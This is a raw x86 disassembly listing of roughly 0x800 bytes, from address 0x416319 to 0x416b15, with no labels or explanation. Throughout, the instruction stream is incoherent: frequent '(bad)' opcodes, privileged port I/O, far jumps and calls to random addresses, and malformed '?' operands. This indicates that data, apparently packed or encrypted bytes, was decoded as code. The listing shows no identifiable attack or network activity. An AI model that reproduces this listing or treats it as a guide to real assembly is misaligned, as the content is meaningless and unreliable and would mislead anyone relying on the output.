  416319:	mov    bl,0x4f
  41631b:	f2xm1  
  41631d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41631e:	ret    
  41631f:	ficom  DWORD PTR [edi+esi*8+0x4]
  416323:	sar    dl,0x5d
  416326:	test   eax,0xfca25f8e
  41632b:	inc    eax
  41632c:	mov    WORD PTR [ecx],ds
  41632e:	cli    
  41632f:	rcr    BYTE PTR [eax-0x5033ca92],1
  416335:	cmp    eax,0xaa2c61ad
  41633a:	pusha  
  41633b:	xchg   esp,eax
  41633d:	pop    ebx
  41633e:	fisttp WORD PTR [esi+0x25]
  416341:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416343:	and    BYTE PTR [ebp+0x65],ah
  416346:	sahf   
  416347:	or     ecx,eax
  416349:	sbb    esp,ecx
  41634b:	arpl   WORD PTR [ebp+0x77cb75a1],sp
  416351:	repz dec edx
  416353:	jmp    0x8b050db4
  416358:	outs   dx,DWORD PTR ds:[esi]
  416359:	and    DWORD PTR [edi+0x20],0xc0d16f8b
  416360:	jns    0x4163b4
  416362:	enter  0xda6e,0xd5
  416366:	and    DWORD PTR [edi-0x4],ebp
  416369:	xor    edx,DWORD PTR [esi]
  41636b:	retf   0x498e
  41636e:	dec    esp
  41636f:	xchg   edx,eax
  416370:	mov    ds:0x68697a7d,eax
  416375:	and    DWORD PTR [ebp+0x55e5bd76],ebx
  41637b:	push   0x73
  41637d:	sub    eax,esi
  41637f:	sahf   
  416380:	pop    ebx
  416381:	xchg   esp,eax
  416382:	or     al,0xa7
  416384:	fs pop eax
  416386:	mov    esi,0xf8d4e3de
  41638b:	fstp   st(1)
  41638d:	int    0x47
  41638f:	and    esi,edx
  416391:	mov    dh,0x96
  416393:	pushf  
  416394:	cmp    al,0xd1
  416396:	outs   dx,DWORD PTR ds:[esi]
  416397:	mov    ah,0xb9
  416399:	out    dx,eax
  41639a:	loop   0x4163ca
  41639c:	mov    eax,ds:0x1f6ed896
  4163a1:	inc    ecx
  4163a2:	cdq    
  4163a3:	xchg   edi,eax
  4163a4:	or     eax,0xa08fbc23
  4163a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163aa:	push   eax
  4163ab:	std    
  4163ac:	adc    ecx,DWORD PTR [esi+eax*8]
  4163af:	clc    
  4163b0:	stos   DWORD PTR es:[edi],eax
  4163b1:	inc    edx
  4163b2:	test   eax,0xff5a3632
  4163b7:	into   
  4163b8:	pusha  
  4163b9:	xor    ebp,DWORD PTR [ebp-0x6327011e]
  4163bf:	jne    0x41641c
  4163c1:	repz repz sub al,0xb7
  4163c5:	push   edi
  4163c6:	fst    st(3)
  4163c8:	(bad)  
  4163c9:	sub    ch,BYTE PTR [edx-0x1f]
  4163cc:	mov    dh,0xfb
  4163ce:	test   DWORD PTR [eax-0x27],0x5be6c9a6
  4163d5:	nop
  4163d6:	and    BYTE PTR [eax+0x4a],dh
  4163d9:	jmp    0x756c0a9d
  4163de:	in     eax,dx
  4163df:	cld    
  4163e0:	retf   0xcd7b
  4163e3:	rcl    DWORD PTR [eax-0x1d062c71],cl
  4163e9:	and    eax,0x9251e4c4
  4163ee:	pop    ecx
  4163ef:	ins    DWORD PTR es:[edi],dx
  4163f0:	shl    DWORD PTR [ebx+0x22],1
  4163f3:	inc    edi
  4163f4:	mov    cl,0xe3
  4163f6:	(bad)  
  4163f7:	xor    DWORD PTR [esi-0xfc88a91],ebx
  4163fd:	stos   BYTE PTR es:[edi],al
  4163fe:	fmul   QWORD PTR [ecx]
  416400:	shl    DWORD PTR [edi-0x35],1
  416403:	(bad)  
  416404:	into   
  416405:	outs   dx,DWORD PTR ds:[esi]
  416406:	or     eax,0xd534e228
  41640b:	pop    eax
  41640c:	mov    ds:0x796bade9,eax
  416411:	sbb    ah,BYTE PTR [edi+0x62]
  416414:	fild   WORD PTR [ebp+0x4f8957f4]
  41641a:	jne    0x41642c
  41641c:	mov    al,0x7b
  41641e:	mov    ebx,0xee320c1e
  416423:	mov    ds:0xc1d9a0d6,eax
  416428:	mov    bl,BYTE PTR fs:[ebp+0x74]
  41642c:	jmp    0x1f50ea23
  416431:	fdiv   st,st(5)
  416433:	ins    DWORD PTR es:[edi],dx
  416434:	cmp    dl,BYTE PTR [ecx]
  416436:	out    dx,al
  416437:	inc    ebx
  416438:	inc    edi
  416439:	gs int 0xb3
  41643c:	imul   ebp,eax,0xffffffd8
  41643f:	int3   
  416440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416441:	loopne 0x41643f
  416443:	(bad)  
  416444:	dec    ecx
  416445:	cmp    bh,bh
  416447:	repnz or BYTE PTR [edx+0x2858a5b9],bh
  41644e:	fstp   DWORD PTR [esi-0x729f7787]
  416454:	test   DWORD PTR [edi+0x34],esp
  416457:	test   eax,0xde89b75e
  41645c:	xchg   esp,eax
  41645d:	dec    esi
  41645e:	jecxz  0x4163ea
  416460:	fadd   QWORD PTR [ebx+0x6a7160ea]
  416466:	jge    0x416495
  416468:	retf   
  416469:	inc    edi
  41646a:	shl    BYTE PTR [edi-0x78],1
  41646d:	js     0x416443
  41646f:	sbb    DWORD PTR [esp+ebp*2-0x1e6679c0],ebp
  416476:	push   edx
  416477:	inc    edi
  416478:	pop    es
  416479:	adc    ch,0x8
  41647c:	hlt    
  41647d:	(bad)  
  41647e:	push   ebx
  41647f:	xchg   BYTE PTR [edi],ch
  416481:	jecxz  0x416483
  416483:	aaa    
  416484:	lods   al,BYTE PTR ds:[esi]
  416485:	out    dx,eax
  416486:	sbb    al,0xea
  416488:	in     al,0xea
  41648a:	(bad)  
  41648b:	cli    
  41648c:	enter  0x913b,0x5c
  416490:	pop    esp
  416491:	adc    ecx,DWORD PTR [ebp+0x76]
  416494:	mov    eax,0xc0e06e10
  416499:	cwde   
  41649a:	sub    BYTE PTR [edx],al
  41649c:	pop    es
  41649d:	jmp    0x3f252aca
  4164a2:	dec    ecx
  4164a3:	les    ecx,FWORD PTR [ebp+edi*4+0x59]
  4164a7:	bound  edx,QWORD PTR [ebp-0x766298b8]
  4164ad:	push   esi
  4164ae:	dec    ebp
  4164af:	ror    DWORD PTR [esi-0x55cec035],1
  4164b5:	xor    DWORD PTR [ebp+esi*2+0x7e01e907],edx
  4164bc:	dec    eax
  4164bd:	or     DWORD PTR [edx],edx
  4164bf:	pop    ebp
  4164c0:	mov    edx,0xfde8f6a6
  4164c5:	xchg   BYTE PTR [edi-0x240aa522],cl
  4164cb:	add    bh,BYTE PTR [edi+0x6f3dc8c6]
  4164d1:	or     al,0x5e
  4164d3:	clc    
  4164d4:	imul   ebp,DWORD PTR ds:0xd202c405,0xfab5f78b
  4164de:	sub    bh,bl
  4164e0:	dec    ebx
  4164e1:	mov    ch,BYTE PTR [ebx-0x72]
  4164e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e5:	imul   edx,DWORD PTR [edi],0xffffff93
  4164e8:	pop    es
  4164e9:	pop    ds
  4164ea:	mov    edx,0x882388cf
  4164ef:	dec    esi
  4164f0:	out    dx,al
  4164f1:	sbb    BYTE PTR [edx+0x1e8f46fd],ah
  4164f7:	jo     0x416519
  4164f9:	xchg   edx,eax
  4164fa:	xchg   ebp,eax
  4164fb:	cwde   
  4164fc:	popf   
  4164fd:	push   ss
  4164fe:	enter  0x9080,0x6e
  416502:	mov    BYTE PTR [ecx-0x11],dh
  416505:	(bad)  
  416506:	adc    eax,0xb26043a7
  41650b:	(bad)
  41650e:	call   0x954:0x27cdce83
  416515:	xor    ebx,DWORD PTR [esi+0x2b6954da]
  41651b:	xor    DWORD PTR [edx-0x78],esi
  41651e:	stc    
  41651f:	enter  0xacd5,0x18
  416523:	hlt    
  416524:	jg     0x416511
  416526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416527:	cmp    al,0xc6
  416529:	test   al,0xbe
  41652b:	mov    ecx,0x5316a650
  416530:	mov    ds:0x91258f35,al
  416535:	scas   eax,DWORD PTR es:[edi]
  416536:	test   al,0x4a
  416538:	ds pop edx
  41653a:	rcr    DWORD PTR [edx+esi*1+0x33ca80c0],1
  416541:	mov    ds:0x9871b415,eax
  416546:	mov    cl,0x9c
  416548:	ficom  DWORD PTR [ebx]
  41654a:	sub    esp,DWORD PTR ds:0xb7a133c2
  416550:	scas   al,BYTE PTR es:[edi]
  416551:	loope  0x416546
  416553:	push   ss
  416554:	mov    ds:0xc55ae6cc,eax
  416559:	icebp  
  41655a:	mov    dh,0x1d
  41655c:	inc    ecx
  41655d:	test   al,0xe3
  41655f:	cmp    eax,ecx
  416561:	push   0xffffffaf
  416563:	out    dx,al
  416564:	mov    ?,ebx
  416566:	cmp    eax,0x70f7f043
  41656b:	arpl   WORD PTR [edi+0x2c],bx
  41656e:	or     eax,0x4f62c4a1
  416573:	inc    edx
  416574:	sbb    eax,DWORD PTR [edi]
  416576:	out    0x86,al
  416578:	outs   dx,DWORD PTR ds:[esi]
  416579:	popf   
  41657a:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41657c:	adc    eax,0x69778bc
  416581:	jmp    0x2f24:0xad7af1fc
  416588:	xchg   DWORD PTR [ecx+0x1eb6c7c7],ebp
  41658e:	daa    
  41658f:	jmp    0xe2a14f3
  416594:	clc    
  416595:	arpl   WORD PTR [edi+0x6679c57b],si
  41659b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41659c:	xor    DWORD PTR [ebp-0x24bd64cd],ebx
  4165a2:	mov    ebx,0x86b549c1
  4165a7:	add    edx,DWORD PTR [esi+0x3d]
  4165aa:	jmp    0x416576
  4165ac:	mov    eax,0x442174c0
  4165b1:	sub    dh,dl
  4165b3:	pop    ebx
  4165b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b5:	xchg   esp,eax
  4165b6:	ja     0x4165dd
  4165b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165b9:	add    al,0xed
  4165bb:	mov    ah,0x3d
  4165bd:	cmp    al,0xab
  4165bf:	loop   0x4165fc
  4165c1:	leave  
  4165c2:	push   0x1294ddc9
  4165c7:	jb     0x41662e
  4165c9:	xor    eax,0x61300d83
  4165ce:	push   ebp
  4165cf:	les    ebx,FWORD PTR [eax+esi*1]
  4165d2:	lea    esp,[eax+ecx*2-0x35]
  4165d6:	push   ebp
  4165d7:	or     ebp,DWORD PTR [ecx+0x43e40fd2]
  4165dd:	mul    DWORD PTR [edi+ebx*1]
  4165e0:	and    al,0x3d
  4165e2:	or     BYTE PTR [ebx],0x8e
  4165e5:	sbb    BYTE PTR [esp+ebx*1+0x1b],cl
  4165e9:	jne    0x4165c6
  4165eb:	call   0xd309fb85
  4165f0:	es je  0x416661
  4165f3:	cmp    DWORD PTR [edi+0x33],edx
  4165f6:	in     al,dx
  4165f7:	fdiv   QWORD PTR [edi+0x2e37e93f]
  4165fd:	(bad)  
  4165fe:	hlt    
  4165ff:	pop    edx
  416600:	loope  0x41658d
  416602:	ins    BYTE PTR es:[edi],dx
  416603:	pop    ebp
  416604:	and    edx,edi
  416606:	pop    edi
  416607:	bt     edi,edx
  41660a:	aas    
  41660b:	add    BYTE PTR [ebx-0x6482dbef],dh
  416611:	ret    0x87e6
  416614:	mov    edi,ebp
  416616:	xchg   DWORD PTR [ebp+0x45],edx
  416619:	(bad)  
  41661a:	std    
  41661b:	pop    ss
  41661c:	xor    dl,cl
  41661e:	xchg   esi,eax
  41661f:	icebp  
  416620:	lds    esp,FWORD PTR [esi]
  416622:	mov    esp,0xb3e550bd
  416627:	dec    eax
  416628:	popa   
  416629:	or     al,0xfa
  41662b:	xor    eax,0xbde578a
  416630:	shl    BYTE PTR [eax+0x5aa99695],0xb4
  416637:	xchg   edx,eax
  416638:	in     al,dx
  416639:	sbb    BYTE PTR [ebp+0x43],0x36
  41663d:	idiv   BYTE PTR ds:0xa03714a9
  416643:	push   esi
  416644:	push   0xe35b5729
  416649:	fsub   QWORD PTR [edi+eax*2+0x2f81e111]
  416650:	dec    esi
  416651:	and    eax,0xb0463ce0
  416656:	jmp    0xf8611b1c
  41665b:	add    eax,0x10ce4179
  416660:	outs   dx,DWORD PTR ds:[esi]
  416661:	in     al,0x21
  416663:	out    0x71,al
  416665:	cmp    eax,0xd44a01f1
  41666a:	push   0xffffffc3
  41666c:	sub    edi,DWORD PTR [esi+edx*2-0x21]
  416670:	pop    edx
  416671:	pusha  
  416672:	mov    WORD PTR [edx+0x41],es
  416675:	mov    al,ds:0xb259d8b
  41667a:	ja     0x41666c
  41667c:	push   es
  41667d:	jnp    0x4166ac
  41667f:	stc    
  416680:	push   ss
  416681:	pop    ecx
  416682:	push   ds
  416683:	leave  
  416684:	in     eax,0xe7
  416686:	lods   al,BYTE PTR ds:[esi]
  416687:	add    ah,dl
  416689:	div    BYTE PTR [edx-0x7de6f53b]
  41668f:	sahf   
  416690:	adc    eax,0xb8ae53b7
  416695:	(bad)  
  416696:	mov    cl,0x9f
  416698:	call   DWORD PTR [eax]
  41669a:	xchg   esi,eax
  41669b:	mov    ds:0x558d0c45,al
  4166a0:	mov    esi,DWORD PTR [edx+eax*8]
  4166a3:	cmp    esp,ecx
  4166a5:	dec    ecx
  4166a6:	sub    DWORD PTR [esi-0x4],ebp
  4166a9:	enter  0x498b,0xe2
  4166ad:	dec    ecx
  4166ae:	bound  ebx,QWORD PTR [eax+0x33]
  4166b1:	add    ah,BYTE PTR [ebp+0x2b3c0fc]
  4166b7:	unpcklps xmm5,xmm2
  4166ba:	mov    ds:0x34fbd3b0,al
  4166bf:	aas    
  4166c0:	ret    0x9a1f
  4166c3:	jae    0x41672c
  4166c5:	fst    QWORD PTR [edx-0x53]
  4166c8:	lock popa 
  4166ca:	add    eax,0x548acc8c
  4166cf:	sbb    eax,0xdbc1e794
  4166d4:	aas    
  4166d5:	clc    
  4166d6:	jg     0x4166da
  4166d8:	sbb    al,0x8d
  4166da:	rcl    DWORD PTR [esi],1
  4166dc:	bound  ebp,QWORD PTR [esi-0x7e]
  4166df:	popa   
  4166e0:	lods   al,BYTE PTR ds:[esi]
  4166e1:	push   ecx
  4166e2:	pusha  
  4166e3:	fldcw  WORD PTR ds:0x328d7f7
  4166e9:	jns    0x41669c
  4166eb:	andnps xmm1,XMMWORD PTR [esp+esi*8-0x5259f0ba]
  4166f3:	cmp    BYTE PTR [edi-0x51],dh
  4166f6:	dec    esp
  4166f7:	repnz daa 
  4166f9:	fwait
  4166fa:	sar    eax,cl
  4166fc:	std    
  4166fd:	sbb    al,0x7b
  4166ff:	and    cl,cl
  416701:	pop    edi
  416702:	mov    ds:0x5bc3f514,eax
  416707:	call   0xd0c9:0x56c4a61a
  41670e:	mov    DWORD PTR [ebp+edx*8-0x4d],edi
  416712:	cmovl  ecx,DWORD PTR [eax-0x14]
  416716:	add    DWORD PTR [edi-0x295e409c],ecx
  41671c:	xor    esi,ecx
  41671e:	push   ebp
  41671f:	mov    ecx,0x349d5676
  416724:	iret   
  416725:	cld    
  416726:	out    dx,al
  416727:	mov    eax,0x7029211e
  41672c:	dec    ebx
  41672d:	mov    esp,0x90bb2fad
  416732:	cli    
  416733:	loop   0x4166c6
  416735:	cmp    al,0x22
  416738:	sti    
  416739:	sti    
  41673a:	ins    DWORD PTR es:[edi],dx
  41673b:	jne    0x4166e9
  41673d:	rol    DWORD PTR [esi-0x7c87b866],0x8a
  416744:	nop
  416745:	js     0x4166ce
  416747:	mov    dh,0x29
  416749:	push   esp
  41674a:	mov    dh,BYTE PTR [edi]
  41674c:	mov    bl,0x48
  41674e:	repnz add eax,DWORD PTR ss:[ecx]
  416752:	lahf   
  416753:	push   ss
  416754:	fwait
  416755:	mov    dh,0x3
  416757:	mov    edx,0x9104a120
  41675c:	and    ch,cl
  41675e:	mov    ds:0x910c38bf,al
  416763:	mov    ds:0xf7e2279,eax
  416768:	cmp    eax,0x25598d54
  41676d:	and    ah,BYTE PTR [ecx-0x1a]
  416770:	out    0x80,al
  416772:	sbb    al,0x48
  416774:	stos   BYTE PTR es:[edi],al
  416775:	push   ss
  416776:	mov    edi,0xd1d02ae4
  41677b:	addr16 das 
  41677d:	fcmovnbe st,st(5)
  41677f:	es pop edi
  416781:	mov    ds:0x7067634a,al
  416786:	out    dx,eax
  416787:	sub    cl,BYTE PTR ds:0xaf3408c7
  41678d:	hlt    
  41678e:	popa   
  41678f:	push   es
  416790:	pop    edx
  416791:	test   BYTE PTR ds:0x9e08a4c8,bl
  416797:	adc    bl,BYTE PTR [ebx]
  416799:	retf   0xb2d1
  41679c:	das    
  41679d:	push   ss
  41679e:	and    eax,0x3b83cc41
  4167a3:	js     0x416812
  4167a5:	xchg   edi,eax
  4167a6:	add    al,0x91
  4167a8:	mov    ebx,0xe2985df8
  4167ad:	mov    ch,0x7b
  4167af:	lock in al,dx
  4167b1:	(bad)  
  4167b2:	fs dec ebp
  4167b4:	ds repnz ss push esi
  4167b8:	cwde   
  4167b9:	enter  0x7475,0xc2
  4167bd:	add    eax,0x2ca9d7e9
  4167c2:	fcomip st,st(7)
  4167c4:	xlat   BYTE PTR ds:[ebx]
  4167c5:	jnp    0x416764
  4167c7:	sbb    al,0x44
  4167c9:	inc    ecx
  4167ca:	sub    DWORD PTR [edx+0x30],esp
  4167cd:	popa   
  4167ce:	mov    ds:0x2cccac09,al
  4167d3:	test   cl,al
  4167d5:	xor    DWORD PTR [ebp+0x4c],0x79a0bb48
  4167dc:	xchg   ebx,eax
  4167dd:	out    0x80,al
  4167df:	arpl   sp,dx
  4167e1:	sbb    BYTE PTR [ebx],0xed
  4167e4:	int3   
  4167e5:	mov    dh,dh
  4167e7:	fisub  WORD PTR [esi-0x574385cf]
  4167ed:	call   0xcb1e:0x32cc595f
  4167f4:	neg    DWORD PTR [edi]
  4167f6:	adc    ch,BYTE PTR [eax+0x41]
  4167f9:	ss pusha 
  4167fb:	aaa    
  4167fc:	ds xchg edi,eax
  4167fe:	pop    edi
  4167ff:	fs jb  0x4167ac
  416802:	mov    DWORD PTR [edx+0x3f],ecx
  416805:	cmp    BYTE PTR [eax],0x75
  416808:	not    DWORD PTR ds:0x50a9d127
  41680e:	jo     0x416808
  416810:	test   BYTE PTR [ebp+0x37],ch
  416813:	jnp    0x96fcee13
  416819:	mov    DWORD PTR ds:0xdc37d3ec,0xfcc8cd10
  416823:	pushf  
  416824:	sbb    DWORD PTR [esi+ebx*2],eax
  416827:	mov    bh,0x6e
  416829:	sbb    ebx,edx
  41682b:	or     eax,0xb6b500a4
  416830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416831:	fmul   QWORD PTR [ebx-0x4a]
  416834:	mov    dh,bh
  416836:	or     ecx,DWORD PTR [edx]
  416838:	pushf  
  416839:	loopne 0x41689c
  41683b:	or     DWORD PTR [eax-0x223c2c49],eax
  416841:	(bad)  
  416842:	aam    0x2c
  416844:	push   0xffffffd0
  416846:	push   eax
  416847:	mov    ecx,DWORD PTR [ecx+ebx*8-0x5]
  41684b:	mov    bh,0x1a
  41684d:	fdiv   QWORD PTR [ecx]
  41684f:	(bad)  
  416850:	retf   
  416851:	in     eax,0x7c
  416853:	fsub   QWORD PTR [ebp-0x7293e11d]
  416859:	mov    esi,ecx
  41685b:	jg     0x4168c0
  41685d:	repnz mov ebp,0xf4a5b77
  416863:	and    dh,dh
  416865:	ins    DWORD PTR es:[edi],dx
  416866:	jb     0x416805
  416868:	call   0xfbcf1036
  41686d:	cmp    ch,bl
  41686f:	adc    BYTE PTR [ecx],bh
  416871:	outs   dx,BYTE PTR ds:[esi]
  416872:	mov    ecx,0x4f3ba157
  416877:	push   es
  416878:	(bad)  
  416879:	xchg   edx,eax
  41687a:	ds je  0x416807
  41687d:	jp     0x41684f
  41687f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416880:	(bad)  [ecx-0x4b]
  416883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416884:	mov    BYTE PTR ss:[eax-0x793f85d9],al
  41688b:	call   0xd893:0xc543a77e
  416892:	ret    
  416893:	lods   al,BYTE PTR ds:[esi]
  416894:	out    dx,eax
  416895:	inc    ebx
  416896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416897:	int    0x44
  416899:	aaa    
  41689a:	pop    es
  41689b:	mov    cl,0xae
  41689d:	adc    edi,DWORD PTR [edx-0x2af003e1]
  4168a3:	ds cli 
  4168a5:	sbb    esp,DWORD PTR [ebx-0x6447fd3a]
  4168ab:	jg     0x4168d2
  4168ad:	mov    esp,DWORD PTR fs:[edx]
  4168b0:	push   ecx
  4168b1:	mov    edi,0x88e446fb
  4168b6:	dec    esp
  4168b7:	mov    edx,0x227c122b
  4168bc:	xchg   edx,eax
  4168bd:	mov    eax,0xa42f3175
  4168c2:	or     BYTE PTR [ecx],ch
  4168c4:	mov    ebx,0xbe55bb35
  4168c9:	mov    ds:0x8aef44b2,eax
  4168ce:	repz mov bh,0x38
  4168d1:	or     al,BYTE PTR [edx+edi*2-0x13]
  4168d5:	inc    ebp
  4168d6:	mov    ah,0xe0
  4168d8:	xor    BYTE PTR ds:0x1f4ee6d3,0x5b
  4168df:	retf   0x2483
  4168e2:	dec    esp
  4168e3:	popa   
  4168e4:	mov    ds:0x59c0ac76,al
  4168e9:	xchg   edi,eax
  4168ea:	repz hlt 
  4168ec:	cld    
  4168ed:	push   0xa5d832a8
  4168f2:	sbb    DWORD PTR [ecx-0x6c],0xbe9d49ef
  4168f9:	xchg   ebx,eax
  4168fa:	out    0x39,eax
  4168fc:	pop    ebp
  4168fd:	lock scas eax,DWORD PTR es:[edi]
  4168ff:	sub    eax,0x734873ce
  416904:	jb     0x41691b
  416906:	add    ah,BYTE PTR [ebx]
  416908:	mov    ds:0x87fa3b2d,al
  41690d:	xchg   esp,eax
  41690e:	adc    DWORD PTR [edx],ebp
  416910:	sbb    eax,0x3e4b93ef
  416915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416916:	test   BYTE PTR [edi+0x22037950],bl
  41691c:	ds jno 0x4168de
  41691f:	jge    0x416980
  416921:	add    BYTE PTR [eax+ebx*1],bl
  416924:	retf   0xeab1
  416927:	ds push edx
  416929:	or     bl,cl
  41692b:	cmp    eax,0xb225e89e
  416930:	rol    DWORD PTR [eax-0x13043b98],1
  416936:	dec    esp
  416937:	jno    0x41691c
  416939:	fadd   DWORD PTR [eax]
  41693b:	fmul   QWORD PTR [ebx-0x25]
  41693e:	xor    BYTE PTR [ebx],dh
  416940:	into   
  416941:	cmp    BYTE PTR [edi+0x10],0xab
  416945:	sbb    esp,esp
  416947:	sbb    BYTE PTR [edx-0x7bcac02e],ch
  41694d:	and    eax,ebx
  41694f:	data16 jnp 0x416958
  416952:	bound  eax,QWORD PTR [eax]
  416954:	in     eax,0xec
  416956:	icebp  
  416957:	inc    eax
  416958:	test   BYTE PTR [esi+ecx*2-0x61cbc981],cl
  41695f:	and    ah,BYTE PTR [edi]
  416961:	out    0x46,eax
  416963:	neg    DWORD PTR [edi-0x660385cc]
  416969:	mov    fs,WORD PTR [edx+0x7f]
  41696c:	into   
  41696d:	xor    esp,0xfae63b2c
  416973:	sub    BYTE PTR [edx+0x37],al
  416976:	fs mov esi,cs
  416979:	adc    BYTE PTR [eax+0x16],dh
  41697c:	mov    al,0x88
  41697e:	into   
  41697f:	lds    edi,FWORD PTR [edx]
  416981:	mov    ?,WORD PTR [ebp+0x4f993e02]
  416987:	hlt    
  416988:	daa    
  416989:	jae    0x41696a
  41698b:	push   es
  41698c:	shr    ah,1
  41698e:	mov    dl,0x94
  416990:	cmc    
  416991:	mov    esp,0x9ecd346b
  416996:	and    al,0x89
  416998:	lea    eax,[ebx-0x44]
  41699b:	mov    ebp,esp
  41699d:	outs   dx,BYTE PTR ds:[esi]
  41699e:	jle    0x41697b
  4169a0:	add    DWORD PTR [eax],edi
  4169a2:	mov    ebx,ss
  4169a4:	out    0xf,eax
  4169a6:	add    dl,BYTE PTR [esi]
  4169a8:	scas   al,BYTE PTR es:[edi]
  4169a9:	push   cs
  4169aa:	stos   BYTE PTR es:[edi],al
  4169ab:	(bad)  
  4169ad:	stos   DWORD PTR es:[edi],eax
  4169ae:	in     eax,dx
  4169af:	cmp    eax,0xa41977b6
  4169b4:	and    ebp,DWORD PTR [edi+0x4534a6a8]
  4169ba:	or     eax,0x5aaf605b
  4169bf:	and    al,0x7f
  4169c1:	jb     0x416960
  4169c3:	adc    al,0x4e
  4169c5:	enter  0xd113,0xd
  4169c9:	jbe    0x4169c9
  4169cb:	inc    ecx
  4169cc:	sbb    DWORD PTR [ecx],eax
  4169ce:	inc    ecx
  4169cf:	mov    esp,0x83edc6b4
  4169d4:	(bad)  
  4169d5:	or     BYTE PTR [esi-0x2e2936ac],cl
  4169db:	cmc    
  4169dc:	hlt    
  4169dd:	adc    bh,ch
  4169df:	imul   edi,eax,0xad98dd75
  4169e5:	neg    ebp
  4169e7:	mov    dh,0x8f
  4169e9:	mov    dh,0xe2
  4169eb:	out    dx,al
  4169ec:	es pop es
  4169ee:	enter  0x5ead,0x5f
  4169f2:	push   eax
  4169f3:	dec    esi
  4169f4:	sub    al,0xf4
  4169f6:	jge    0x4169ef
  4169f8:	xor    BYTE PTR [ebp+edx*4-0x34df861],ah
  4169ff:	call   0xec2e6ca8
  416a04:	addr16 inc eax
  416a06:	push   edx
  416a07:	pop    esi
  416a08:	scas   al,BYTE PTR es:[edi]
  416a09:	cmp    eax,0x84d34ba4
  416a0e:	lods   al,BYTE PTR ds:[esi]
  416a0f:	push   eax
  416a10:	xor    ebx,DWORD PTR [ebp-0x18]
  416a13:	test   DWORD PTR [esi],0xb544617b
  416a19:	(bad)  
  416a1a:	imul   ebp,DWORD PTR [ebp+edi*2+0x59125334],0x11fcdd4d
  416a25:	xchg   ebx,eax
  416a26:	mov    BYTE PTR [edx-0x34],ch
  416a29:	aam    0x6a
  416a2b:	push   ebx
  416a2c:	les    ecx,FWORD PTR [esi+0x57457b62]
  416a32:	push   esi
  416a33:	mov    eax,0x5881c897
  416a38:	push   ds
  416a39:	pop    es
  416a3a:	xchg   esp,eax
  416a3b:	and    DWORD PTR [ebx],eax
  416a3d:	lods   al,BYTE PTR ds:[esi]
  416a3e:	pop    DWORD PTR [edi+0x24e2d1c9]
  416a44:	mov    cs,ecx
  416a46:	out    0x40,al
  416a48:	popa   
  416a49:	test   eax,0x45895db3
  416a4e:	arpl   WORD PTR [ebp+0x78],si
  416a51:	mov    ah,0x61
  416a53:	jge    0x416a7b
  416a55:	push   edx
  416a56:	nop
  416a57:	sub    al,0x76
  416a59:	aad    0xaf
  416a5b:	mov    esi,0x24ee8a0
  416a60:	arpl   cx,cx
  416a62:	ja     0x416a81
  416a64:	xchg   edi,eax
  416a65:	and    DWORD PTR [ecx],edi
  416a67:	jg     0x416a47
  416a69:	cmp    bl,BYTE PTR [ebx]
  416a6b:	fild   QWORD PTR [ebp+0x3b]
  416a6e:	jnp    0x416a65
  416a70:	sub    ebx,eax
  416a72:	ficom  WORD PTR [ebx]
  416a74:	sbb    eax,DWORD PTR ds:0x829460b2
  416a7a:	rcl    DWORD PTR [eax+ecx*8],0x4e
  416a7e:	mov    WORD PTR [eax+esi*4],cs
  416a81:	mov    cl,0x7a
  416a83:	cmovl  eax,DWORD PTR [edx-0x6f4ccefc]
  416a8a:	inc    ecx
  416a8b:	repz sbb al,0xe
  416a8e:	ds add bl,dh
  416a91:	jo     0x416a53
  416a93:	jnp    0x416a7f
  416a95:	add    al,0x35
  416a97:	outs   dx,BYTE PTR ds:[esi]
  416a98:	add    al,0xf0
  416a9a:	push   edx
  416a9b:	in     eax,dx
  416a9c:	std    
  416a9d:	xchg   esp,eax
  416a9e:	lea    edx,[eax+edi*2]
  416aa1:	mov    ah,0x71
  416aa3:	cmp    bl,BYTE PTR [ecx-0x34f422ed]
  416aa9:	sbb    eax,0x5fe6c0b
  416aae:	and    ah,dh
  416ab0:	gs std 
  416ab2:	ins    DWORD PTR es:[edi],dx
  416ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ab4:	cld    
  416ab5:	int3   
  416ab6:	push   eax
  416ab7:	mov    bh,0x21
  416ab9:	push   edx
  416aba:	aaa    
  416abb:	cmp    eax,0xc3008505
  416ac0:	aaa    
  416ac1:	push   ds
  416ac2:	ret    0x2be7
  416ac5:	in     eax,dx
  416ac6:	sbb    DWORD PTR [edx-0x10],eax
  416ac9:	mov    ch,0x4a
  416acb:	idiv   DWORD PTR [esi+0x7b4b3039]
  416ad1:	aad    0xd5
  416ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ad4:	cmp    ebp,DWORD PTR [edi+0x2]
  416ad7:	sub    al,0x78
  416ad9:	das    
  416ada:	ja     0x416b1b
  416adc:	push   es
  416add:	mov    al,0xf0
  416adf:	cmp    al,0x2
  416ae1:	repz (bad) 
  416ae3:	jg     0x416ad8
  416ae5:	inc    ecx
  416ae6:	int3   
  416ae7:	outs   dx,DWORD PTR ds:[esi]
  416ae8:	loope  0x416afb
  416aea:	cmp    eax,0x7f2e80a1
  416aef:	push   eax
  416af0:	aaa    
  416af1:	test   eax,0x60c01126
  416af6:	data16 add BYTE PTR [esi-0x2e],bl
  416afa:	adc    DWORD PTR [edx-0x2f],ecx
  416afd:	cwde   
  416afe:	popa   
  416aff:	leave  
  416b00:	xchg   BYTE PTR [esi+eax*4-0x5712cfbb],ah
  416b07:	jb     0x416ad3
  416b09:	jp     0x416af1
  416b0b:	jmp    0x340ace98
  416b10:	cdq    
  416b11:	xchg   esp,eax
  416b12:	ret    
  416b13:	dec    ecx
  416b14:	pop    esi
  416b15:	sub    dl,cl
